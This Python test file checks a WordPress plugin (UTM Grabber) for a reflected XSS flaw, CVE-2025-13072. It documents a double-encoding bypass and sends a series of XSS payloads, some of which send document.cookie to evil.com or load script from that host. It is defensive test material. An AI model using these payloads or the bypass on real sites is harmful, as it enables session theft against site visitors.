"""
Vulnerability tests for UTM Grabber plugin.
These tests verify the reflected XSS vulnerability status.

Test behavior:
- FAIL in vulnerable state (XSS payload executes/appears unescaped)
- PASS in fixed state (XSS payload is properly escaped)

CVE-2025-13072 Vulnerability:
The vulnerability exists because the shortcode handler calls urldecode() on cookie values
without escaping the output. Double-encoded payloads bypass the initial htmlspecialchars()
filter and are decoded back to malicious HTML when rendered.

Exploitation technique:
1. Send double-encoded XSS payload: %253Cscript%253E (which is %3Cscript%3E URL-encoded)
2. Plugin stores %3Cscript%3E in cookie after htmlspecialchars() (no effect on % signs)
3. Shortcode calls urldecode() on cookie value, decoding %3C to <
4. XSS payload <script> is output without escaping
"""

import pytest
import requests
import time
from urllib.parse import quote

BASE_URL = "http://localhost"
# Page with [utm_source] shortcode - use pagename parameter for reliability
TEST_PAGE_URL = f"{BASE_URL}/?pagename=utm-test"


def wait_for_wordpress(timeout=120):
    """Wait for WordPress to be ready."""
    start = time.time()
    while time.time() - start < timeout:
        try:
            response = requests.get(BASE_URL, timeout=5)
            if response.status_code == 200:
                return True
        except requests.exceptions.RequestException:
            pass
        time.sleep(2)
    return False


def double_encode(payload):
    """Double-encode a payload for urldecode bypass attack.

    This mimics the attack vector where:
    1. < becomes %3C becomes %253C
    2. Plugin stores %3C in cookie (htmlspecialchars doesn't touch %)
    3. urldecode() in shortcode converts %3C back to <
    """
    # First encode
    single_encoded = quote(payload, safe='')
    # Second encode
    double_encoded = quote(single_encoded, safe='')
    return double_encoded


class TestReflectedXSSVulnerability:
    """Test that XSS payloads in UTM parameters are properly escaped.

    These tests use the double-encoding technique that exploits CVE-2025-13072.
    In a vulnerable environment, all tests should FAIL because the XSS payloads
    will appear unescaped in the response.
    """

    @pytest.fixture(autouse=True)
    def setup(self):
        """Ensure WordPress is ready before tests."""
        assert wait_for_wordpress(), "WordPress did not become ready in time"

    def test_basic_script_tag_xss(self):
        """Test that basic <script> tag injection is escaped (via double-encoding)."""
        payload = "<script>alert('XSS')</script>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        # In fixed version, the script tag should be escaped, not appear as raw HTML
        assert "<script>alert('XSS')</script>" not in response.text, \
            "Unescaped script tag found in response - XSS vulnerability present"

    def test_script_tag_with_document_cookie(self):
        """Test cookie-stealing script injection is escaped (via double-encoding)."""
        payload = "<script>document.location='http://evil.com/?c='+document.cookie</script>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "<script>document.location=" not in response.text, \
            "Unescaped script tag with cookie theft found - XSS vulnerability present"

    def test_img_tag_onerror_xss(self):
        """Test img tag with onerror event handler is escaped (via double-encoding)."""
        payload = "<img src=x onerror=alert('XSS')>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        # Check that the onerror handler doesn't appear as executable HTML
        assert "<img src=x onerror=" not in response.text, \
            "Unescaped img onerror tag found - XSS vulnerability present"

    def test_svg_onload_xss(self):
        """Test SVG tag with onload event handler is escaped (via double-encoding)."""
        payload = "<svg onload=alert('XSS')>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "<svg onload=" not in response.text, \
            "Unescaped svg onload tag found - XSS vulnerability present"

    def test_body_onload_xss(self):
        """Test body tag with onload event handler is escaped (via double-encoding)."""
        payload = "<body onload=alert('XSS')>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "<body onload=" not in response.text, \
            "Unescaped body onload tag found - XSS vulnerability present"

    def test_iframe_injection(self):
        """Test iframe injection is escaped (via double-encoding)."""
        payload = "<iframe src='http://evil.com'></iframe>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        # The iframe should not appear as actual HTML element
        assert "<iframe src=" not in response.text.lower(), \
            "Unescaped iframe tag found - XSS vulnerability present"

    def test_script_with_src_attribute(self):
        """Test script tag with external src is escaped (via double-encoding)."""
        payload = "<script src='http://evil.com/xss.js'></script>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        # Check for the specific malicious payload, not WordPress's own script tags
        assert "<script src='http://evil.com/xss.js'>" not in response.text, \
            "Unescaped script src tag found - XSS vulnerability present"

    def test_javascript_protocol_in_anchor(self):
        """Test javascript: protocol in anchor tag is escaped (via double-encoding)."""
        payload = "<a href='javascript:alert(1)'>click</a>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "javascript:alert" not in response.text, \
            "javascript: protocol found in href - XSS vulnerability present"

    def test_div_onmouseover_xss(self):
        """Test div with onmouseover event handler is escaped (via double-encoding)."""
        payload = "<div onmouseover=alert('XSS')>test</div>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "onmouseover=alert" not in response.text.lower(), \
            "Unescaped onmouseover event handler found - XSS vulnerability present"

    def test_input_onfocus_xss(self):
        """Test input with onfocus event handler is escaped (via double-encoding)."""
        payload = "<input onfocus=alert('XSS') autofocus>"
        encoded_payload = double_encode(payload)
        url = f"{TEST_PAGE_URL}&utm_source={encoded_payload}"

        response = requests.get(url)
        assert response.status_code == 200

        assert "onfocus=alert" not in response.text.lower(), \
            "Unescaped onfocus event handler found - XSS vulnerability present"


class TestCookieBasedXSS:
    """Test XSS via direct cookie injection.

    These tests simulate the state after a double-encoded payload has been stored
    in the cookie. They verify that the shortcode output is properly escaped.
    """

    @pytest.fixture(autouse=True)
    def setup(self):
        """Ensure WordPress is ready before tests."""
        assert wait_for_wordpress(), "WordPress did not become ready in time"

    def test_xss_via_cookie_script_tag(self):
        """Test that XSS payload in cookie is escaped when rendered."""
        session = requests.Session()
        # Directly set malicious cookie value (simulating stored double-encoded payload)
        # Use payload without quotes to avoid addslashes() escaping confusion
        session.cookies.set('utm_source', "<script>alert(1)</script>")

        response = session.get(TEST_PAGE_URL)
        assert response.status_code == 200

        # In fixed version, the output should be escaped
        # Check for the script tag appearing unescaped
        assert "<script>alert(1)</script>" not in response.text, \
            "Unescaped script tag from cookie - XSS vulnerability present"

    def test_xss_via_cookie_img_onerror(self):
        """Test that img onerror payload in cookie is escaped when rendered."""
        session = requests.Session()
        session.cookies.set('utm_source', "<img src=x onerror=alert(1)>")

        response = session.get(TEST_PAGE_URL)
        assert response.status_code == 200

        assert "<img src=x onerror=" not in response.text, \
            "Unescaped img tag from cookie - XSS vulnerability present"

    def test_xss_via_cookie_svg_onload(self):
        """Test that svg onload payload in cookie is escaped when rendered."""
        session = requests.Session()
        session.cookies.set('utm_source', "<svg onload=alert(1)>")

        response = session.get(TEST_PAGE_URL)
        assert response.status_code == 200

        assert "<svg onload=" not in response.text, \
            "Unescaped svg tag from cookie - XSS vulnerability present"

    def test_xss_via_cookie_document_cookie(self):
        """Test cookie stealing payload is escaped when rendered."""
        session = requests.Session()
        payload = "<script>new Image().src='http://evil.com/?c='+document.cookie</script>"
        session.cookies.set('utm_source', payload)

        response = session.get(TEST_PAGE_URL)
        assert response.status_code == 200

        # Check for the full unescaped script tag - if escaped, the < will become &lt;
        assert "<script>new Image()" not in response.text, \
            "Cookie stealing script from cookie - XSS vulnerability present"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
